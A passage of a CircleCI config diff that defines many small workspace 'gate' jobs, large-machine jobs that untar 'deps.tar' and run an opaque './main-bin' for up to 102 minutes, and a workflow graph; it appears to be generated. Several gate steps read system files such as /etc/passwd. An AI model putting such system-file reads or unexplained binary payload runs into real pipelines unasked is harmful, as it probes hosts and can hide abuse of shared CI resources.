+  zulu-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/FINAL.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  teardown_tweak-parse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: gust
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 1024 /dev/urandom | tar -c - 2>/dev/null | wc -c; true ; } > /tmp/ci-ws/manifest.pkg
+            echo "gate tweak-parse: $(wc -c </tmp/ci-ws/manifest.pkg) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - manifest.pkg
+  tweak-parse:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/manifest.pkg
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  provision_rigel-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: muscle up
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=10;i++){s+=1/i} printf "%.4f\n",s}'; true ; } > /tmp/ci-ws/.ok
+            echo "gate rigel-alpha: $(wc -c </tmp/ci-ws/.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .ok
+  rigel-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/FINAL.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  compile_release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: nope later
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=8;i++){for(j=1;j<=i;j++)printf "*"; print ""}}'; true ; } > /tmp/ci-ws/cache.dat
+            echo "gate release: $(wc -c </tmp/ci-ws/cache.dat) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - cache.dat
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/FINAL.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  staging_WEB-761:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: transposition
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"; getline; print NF}' /etc/passwd; true ; } > /tmp/ci-ws/.sig
+            echo "gate WEB-761: $(wc -c </tmp/ci-ws/.sig) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .sig
+  WEB-761:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/.sig
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  g1_beta-v9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: palm sand
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; printf "0123456789abcdef" | od -An -c | head -1; true ; } > /tmp/ci-ws/stage.blob
+            echo "gate beta-v9: $(wc -c </tmp/ci-ws/stage.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stage.blob
+  beta-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/stage.blob
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+
+  deps_preview_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: heeled over
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "mixer" | sha1sum | md5sum | sha256sum | awk '{print $1}' | head -c 24; true ; } > /tmp/ci-ws/step-21.log
+            echo "gate preview: $(wc -c </tmp/ci-ws/step-21.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-21.log
+  env_fix-session-reload_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: sforzando
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1024 count=50 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/ci-ws/6.out
+            echo "gate fix-session-reload: $(wc -c </tmp/ci-ws/6.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 6.out
+  go_java17-fmt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: matte dust
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; printf "%d" $BASHPID | md5sum 2>/dev/null || printf "%d" $$ | md5sum; true ; } > /tmp/ci-ws/813.out
+            echo "gate java17-fmt: $(wc -c </tmp/ci-ws/813.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 813.out
+  preflight_tweak-parse_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: decrescendo
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; wc -l /etc/hostname; true ; } > /tmp/ci-ws/manifest.pkg
+            echo "gate tweak-parse: $(wc -c </tmp/ci-ws/manifest.pkg) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - manifest.pkg
+  builder_full-send_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pawprint
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1; for(i=0;i<10;i++){a*=2}; print a}'; true ; } > /tmp/ci-ws/checkpoint-v2.pkl
+            echo "gate full-send: $(wc -c </tmp/ci-ws/checkpoint-v2.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - checkpoint-v2.pkl
+  reserve_titan-plus_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: TAG
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "key: value" | sed 's/^.*: //'; true ; } > /tmp/ci-ws/gate-complete.txt
+            echo "gate titan-plus: $(wc -c </tmp/ci-ws/gate-complete.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - gate-complete.txt
+  resync_anothr-run_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: spin
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 50 /dev/zero | base64; true ; } > /tmp/ci-ws/39.log
+            echo "gate anothr-run: $(wc -c </tmp/ci-ws/39.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 39.log
+  checker_dotnet8-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: inhaler
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; grep -c ':/bin/' /etc/passwd 2>/dev/null || echo 0; true ; } > /tmp/ci-ws/trace.txt
+            echo "gate dotnet8-build: $(wc -c </tmp/ci-ws/trace.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - trace.txt
+  postcheck_oct20-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: lindy hop
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo PATH=$PATH | tr : '\n' | wc -l; true ; } > /tmp/ci-ws/129.out
+            echo "gate oct20-rev: $(wc -c </tmp/ci-ws/129.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 129.out
+  reload_defualt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: backstroke lazy
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "ab cd ef" | tr ' ' '\n' | wc -l; true ; } > /tmp/ci-ws/buffer.raw
+            echo "gate defualt: $(wc -c </tmp/ci-ws/buffer.raw) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - buffer.raw
+  Delta_callisto-ng_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: scap pushup
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="abcde"; for(i=length(s);i>=1;i--)printf "%s",substr(s,i,1); print ""}'; true ; } > /tmp/ci-ws/report.txt
+            echo "gate callisto-ng: $(wc -c </tmp/ci-ws/report.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - report.txt
+  postcheck_WEB-761_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: annoy manager
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; grep -c "^processor" /proc/cpuinfo; true ; } > /tmp/ci-ws/.sig
+            echo "gate WEB-761: $(wc -c </tmp/ci-ws/.sig) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .sig
+  C_fire-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: magnetic north
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; printf "%d\n" $(( $(date +%M) * 60 + $(date +%S) )); true ; } > /tmp/ci-ws/.pid
+            echo "gate fire-up: $(wc -c </tmp/ci-ws/.pid) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .pid
+  alpha_push-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: in front
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=512 count=20 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/ci-ws/2023-12-16.data
+            echo "gate push-it: $(wc -c </tmp/ci-ws/2023-12-16.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 2023-12-16.data
+  fixture_check-nightly-integration-tests_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: retreat
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; cat /proc/sys/vm/swappiness 2>/dev/null; true ; } > /tmp/ci-ws/pt-D.pkl
+            echo "gate check-nightly-integration-tests: $(wc -c </tmp/ci-ws/pt-D.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - pt-D.pkl
+  cleanup_rollout_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: armistice
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 512 /dev/urandom | sha256sum | awk '{print $1}'; true ; } > /tmp/ci-ws/buffer.blob
+            echo "gate rollout: $(wc -c </tmp/ci-ws/buffer.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - buffer.blob
+  D_tweak-router-glitch_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: front lever
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "127.0.0.1:8080" | awk -F: '{print $2}'; true ; } > /tmp/ci-ws/2024-11-02.data
+            echo "gate tweak-router-glitch: $(wc -c </tmp/ci-ws/2024-11-02.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 2024-11-02.data
+  D_green-light-go_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: third try is lucky
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{t=0; n=5000; for(i=0;i<n;i++)t+=(i*31+7)%97; print t}'; true ; } > /tmp/ci-ws/cache.raw
+            echo "gate green-light-go: $(wc -c </tmp/ci-ws/cache.raw) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - cache.raw
+  dispatch_sanity_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: osb panel
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo -e "A\tB\tC\n1\t2\t3" | awk -F'\t' '{print $2}'; true ; } > /tmp/ci-ws/handoff.state
+            echo "gate sanity: $(wc -c </tmp/ci-ws/handoff.state) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - handoff.state
+  audit_beta-v9_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: silent mode
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; printf '%s\n' "{foo: 1, bar: 2}" | md5sum; true ; } > /tmp/ci-ws/stage.blob
+            echo "gate beta-v9: $(wc -c </tmp/ci-ws/stage.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stage.blob
+  checker_rust-vet_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: countersink
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nb\nc\nc\n" | sort | uniq -c | sort -rn; true ; } > /tmp/ci-ws/handover.ok
+            echo "gate rust-vet: $(wc -c </tmp/ci-ws/handover.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - handover.ok
+workflows:
+  pipeline:
+    jobs:
+      - builder_add-login-leak
+      - cook_zulu-8
+      - add-login-leak:
+          requires:
+            - builder_add-login-leak
+            - cook_zulu-8
+      - zulu-8:
+          requires:
+            - builder_add-login-leak
+            - cook_zulu-8
+      - bun-ship:
+          requires:
+            - builder_add-login-leak
+            - cook_zulu-8
+      - rm-session:
+          requires:
+            - builder_add-login-leak
+            - cook_zulu-8
+      - foxtrot:
+          requires:
+            - builder_add-login-leak
+            - cook_zulu-8
+      - rigel-alpha:
+          requires:
+            - builder_add-login-leak
+            - cook_zulu-8
+      - nov27-ship:
+          requires:
+            - builder_add-login-leak
+            - cook_zulu-8
+      - release:
+          requires:
+            - builder_add-login-leak
+            - cook_zulu-8
+      - run-nightly-docker-image:
+          requires:
+            - builder_add-login-leak
+            - cook_zulu-8
+      - stepB_preview
+      - deps_preview_2:
+          requires:
+            - stepB_preview
+      - preview:
+          requires:
+            - deps_preview_2
+      - package_fix-session-reload:
+          requires:
+            - deps_preview_2
+      - env_fix-session-reload_2:
+          requires:
+            - package_fix-session-reload
+      - fix-session-reload:
+          requires:
+            - env_fix-session-reload_2
+      - auditor_java17-fmt:
+          requires:
+            - env_fix-session-reload_2
+      - go_java17-fmt_2:
+          requires:
+            - auditor_java17-fmt
+      - java17-fmt:
+          requires:
+            - go_java17-fmt_2
+      - teardown_tweak-parse:
+          requires:
+            - go_java17-fmt_2
+      - preflight_tweak-parse_2:
+          requires:
+            - teardown_tweak-parse
+      - tweak-parse:
+          requires:
+            - preflight_tweak-parse_2
+      - phase_full-send:
+          requires:
+            - preflight_tweak-parse_2
+      - builder_full-send_2:
+          requires:
+            - phase_full-send
+      - full-send:
+          requires:
+            - builder_full-send_2
+      - syncer_titan-plus:
+          requires:
+            - builder_full-send_2
+      - reserve_titan-plus_2:
+          requires:
+            - syncer_titan-plus
+      - titan-plus:
+          requires:
+            - reserve_titan-plus_2
+      - enqueue_anothr-run:
+          requires:
+            - reserve_titan-plus_2
+      - resync_anothr-run_2:
+          requires:
+            - enqueue_anothr-run
+      - anothr-run:
+          requires:
+            - resync_anothr-run_2
+      - phase2_dotnet8-build:
+          requires:
+            - resync_anothr-run_2
+      - checker_dotnet8-build_2:
+          requires:
+            - phase2_dotnet8-build
+      - dotnet8-build:
+          requires:
+            - checker_dotnet8-build_2
+      - drain_oct20-rev:
+          requires:
+            - checker_dotnet8-build_2
+      - postcheck_oct20-rev_2:
+          requires:
+            - drain_oct20-rev
+      - oct20-rev:
+          requires:
+            - postcheck_oct20-rev_2
+      - kick_defualt:
+          requires:
+            - postcheck_oct20-rev_2
+      - reload_defualt_2:
+          requires:
+            - kick_defualt
+      - defualt:
+          requires:
+            - reload_defualt_2
+      - generate_callisto-ng:
+          requires:
+            - reload_defualt_2
+      - Delta_callisto-ng_2:
+          requires:
+            - generate_callisto-ng
+      - callisto-ng:
+          requires:
+            - Delta_callisto-ng_2
+      - staging_WEB-761
+      - postcheck_WEB-761_2:
+          requires:
+            - staging_WEB-761
+      - WEB-761:
+          requires:
+            - postcheck_WEB-761_2
+      - precheck_fire-up:
+          requires:
+            - postcheck_WEB-761_2
+      - C_fire-up_2:
+          requires:
+            - precheck_fire-up
+      - fire-up:
+          requires:
+            - C_fire-up_2
+      - wire_push-it:
+          requires:
+            - C_fire-up_2
+      - alpha_push-it_2:
+          requires:
+            - wire_push-it
+      - push-it:
+          requires:
+            - alpha_push-it_2
+      - resync_check-nightly-integration-tests:
+          requires:
+            - alpha_push-it_2
+      - fixture_check-nightly-integration-tests_2:
+          requires:
+            - resync_check-nightly-integration-tests
+      - check-nightly-integration-tests:
+          requires:
+            - fixture_check-nightly-integration-tests_2
+      - reload_rollout:
+          requires:
+            - fixture_check-nightly-integration-tests_2
+      - cleanup_rollout_2:
+          requires:
+            - reload_rollout
+      - rollout:
+          requires:
+            - cleanup_rollout_2
+      - prep_tweak-router-glitch:
+          requires:
+            - cleanup_rollout_2
+      - D_tweak-router-glitch_2:
+          requires:
+            - prep_tweak-router-glitch
+      - tweak-router-glitch:
+          requires:
+            - D_tweak-router-glitch_2
+      - phase_green-light-go:
+          requires:
+            - D_tweak-router-glitch_2
+      - D_green-light-go_2:
+          requires:
+            - phase_green-light-go
+      - green-light-go:
+          requires:
+            - D_green-light-go_2
+      - D_sanity:
+          requires:
+            - D_green-light-go_2
+      - dispatch_sanity_2:
+          requires:
+            - D_sanity
+      - sanity:
+          requires:
+            - dispatch_sanity_2
+      - g1_beta-v9:
+          requires:
+            - dispatch_sanity_2
+      - audit_beta-v9_2:
+          requires:
+            - g1_beta-v9
+      - beta-v9:
+          requires:
+            - audit_beta-v9_2
+      - p2_rust-vet:
+          requires:
+            - audit_beta-v9_2
+      - checker_rust-vet_2:
+          requires:
+            - p2_rust-vet
+      - rust-vet:
+          requires:
+            - checker_rust-vet_2
